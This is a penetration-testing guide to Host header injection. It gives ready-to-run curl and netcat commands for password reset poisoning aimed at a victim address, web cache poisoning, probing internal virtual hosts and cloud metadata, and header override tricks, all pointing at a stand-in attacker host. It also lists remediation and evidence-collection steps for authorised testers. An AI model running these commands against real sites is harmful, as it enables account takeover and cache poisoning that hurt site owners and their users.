# Host Header Injection Testing

## Overview
Host header injection exploits applications that implicitly trust the HTTP `Host` header to generate URLs, route requests, or make security decisions. Since the `Host` header is client-controlled, attackers can manipulate it to poison password reset links, corrupt web caches, bypass virtual host access controls, cause SSRF via routing manipulation, and enable further attacks when the application uses the Host header in link generation or business logic.

## Classification
- **CWE:** CWE-20 (Improper Input Validation), CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax)
- **OWASP:** A05:2021 - Security Misconfiguration
- **CVSS Base:** 5.3 - 9.1

## Detection Methodology

### 1. Basic Host Header Manipulation
```bash
# Inject arbitrary Host header
curl -s -D- -H "Host: evil.com" https://target.com/

# Check response for:
# - Redirects to evil.com
# - Links containing evil.com
# - evil.com appearing in page content
```

### 2. Password Reset Poisoning
The most impactful Host header attack. If the application uses the Host header to build password reset URLs:

```bash
# Step 1: Request password reset for victim
curl -s -X POST https://target.com/forgot-password \
  -H "Host: evil.com" \
  -d "email=victim@target.com"

# If vulnerable, victim receives:
# "Click here to reset: https://evil.com/reset?token=SECRET_TOKEN"
#
# When victim clicks the link, attacker captures the token
```

**Variations:**
```bash
# X-Forwarded-Host (often processed before Host)
curl -s -X POST https://target.com/forgot-password \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=victim@target.com"

# Absolute URL in request line (overrides Host in some servers)
# Must use raw socket or Burp
printf 'POST http://evil.com/forgot-password HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 24\r\n\r\nemail=victim@target.com' | nc target.com 80

# Duplicate Host headers
curl -s -X POST https://target.com/forgot-password \
  -H "Host: evil.com" -H "Host: target.com" \
  -d "email=victim@target.com"

# Port injection
curl -s -X POST https://target.com/forgot-password \
  -H "Host: target.com:evil.com" \
  -d "email=victim@target.com"

# Subdomain injection
curl -s -X POST https://target.com/forgot-password \
  -H "Host: evil.com.target.com" \
  -d "email=victim@target.com"
```

### 3. Web Cache Poisoning via Host Header
```bash
# Poison cache with malicious Host header
curl -s "https://target.com/" -H "Host: evil.com"

# If the response is cached and served to other users:
# All users receive page with links/resources pointing to evil.com
# Including JS includes → stored XSS at scale

# Verify caching
curl -s "https://target.com/" | grep "evil.com"
```

### 4. Routing-Based Attacks
```bash
# Access internal applications via Host header routing
curl -s -H "Host: internal-app.target.local" https://target.com/

# Access other virtual hosts on the same server
curl -s -H "Host: admin.target.com" https://target.com/
curl -s -H "Host: staging.target.com" https://target.com/
curl -s -H "Host: dev.target.com" https://target.com/
curl -s -H "Host: localhost" https://target.com/

# SSRF via routing (back-end trusts Host header for internal routing)
curl -s -H "Host: 169.254.169.254" https://target.com/
```

### 5. Override Headers
Several non-standard headers can override or supplement the Host header:
```bash
# Test each override header
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" \
  "X-HTTP-Host-Override" "Forwarded" "X-Original-URL" \
  "X-Rewrite-URL" "X-Proxy-Host"; do
  echo "--- $header ---"
  curl -s -D- -o /dev/null -H "$header: evil.com" https://target.com/ \
    | head -20
done

# Forwarded header (RFC 7239)
curl -s -H "Forwarded: host=evil.com" https://target.com/
```

### 6. Absolute URL Bypass
```bash
# Some servers prioritize the Host from the absolute URL in the request line
# over the Host header itself
# Use netcat or Burp for raw request control:

printf 'GET http://evil.com/ HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n' \
  | nc target.com 80
```

### 7. Port-Based Injection
```bash
# Inject via port suffix (some parsers only check hostname, not port)
curl -s -H "Host: target.com:@evil.com" https://target.com/
curl -s -H "Host: target.com:evil.com" https://target.com/
curl -s -H "Host: target.com:80@evil.com" https://target.com/
```

### 8. Connection State Attacks (HTTP/1.1 Keep-Alive)
```bash
# First request uses legitimate Host, second request uses malicious Host
# on the same keep-alive connection
# The second request may bypass Host validation applied only to the first request

# Use Burp Repeater with HTTP/1 keep-alive for this technique
```

### 9. Email Link Generation
Beyond password reset, check any feature that sends URLs via email:
```bash
# Account verification emails
curl -s -X POST https://target.com/register \
  -H "Host: evil.com" \
  -d "email=test@test.com&password=test123"

# Invitation links
curl -s -X POST https://target.com/invite \
  -H "Host: evil.com" \
  -d "email=victim@target.com"

# Share/export links
curl -s -X POST https://target.com/share \
  -H "Host: evil.com" \
  -d "documentId=12345&email=victim@target.com"
```

## Tool Usage
```bash
# Nuclei host header injection templates
nuclei -u https://target.com -t http/misconfiguration/host-header/ -batch

# Manual testing with curl (comprehensive)
TARGET="https://target.com"
for path in "/" "/login" "/forgot-password" "/register"; do
  echo "=== Testing $path ==="
  curl -s -D- -o /dev/null -H "Host: evil.com" "$TARGET$path" | head -5
  curl -s -D- -o /dev/null -H "X-Forwarded-Host: evil.com" "$TARGET$path" | head -5
done

# Burp Suite
# 1. Identify password reset or link-generation functionality
# 2. Modify Host header in Repeater
# 3. Check email content for poisoned URLs
# 4. Test with Collaborator domain for blind detection

# Check if Host header value is reflected in page
curl -s -H "Host: evil-test-12345.com" https://target.com/ | grep "evil-test-12345"

# Param Miner (Burp Extension) for header discovery
# Identifies which headers the application processes
```

## Remediation
1. **Do not trust the Host header** -- use a server-side configured value for URL generation
2. **Whitelist allowed Host values** -- reject requests with unexpected Host headers
3. **Use relative URLs** -- avoid building absolute URLs from the Host header
4. **Configure web server** -- set explicit `server_name` (Nginx) or `ServerName` (Apache)
5. **Ignore override headers** -- strip X-Forwarded-Host and similar headers unless from a trusted proxy
6. **Separate virtual hosts** -- ensure the default virtual host does not expose sensitive applications
7. **Framework configuration** -- set `ALLOWED_HOSTS` (Django), `server.address` (Spring), etc.
8. **Cache key includes Host** -- ensure caching infrastructure keys on the Host header

## Evidence Collection
- Original request with manipulated Host header
- Response showing the injected host value in links, redirects, or content
- Password reset email containing the poisoned URL (sanitize tokens)
- Cache poisoning evidence (X-Cache headers, multiple users affected)
- Routing bypass results (access to internal virtual hosts)
- Override header that was effective (X-Forwarded-Host, Forwarded, etc.)
- Impact assessment (account takeover via reset poisoning, cached XSS scope)
- Server software and configuration details
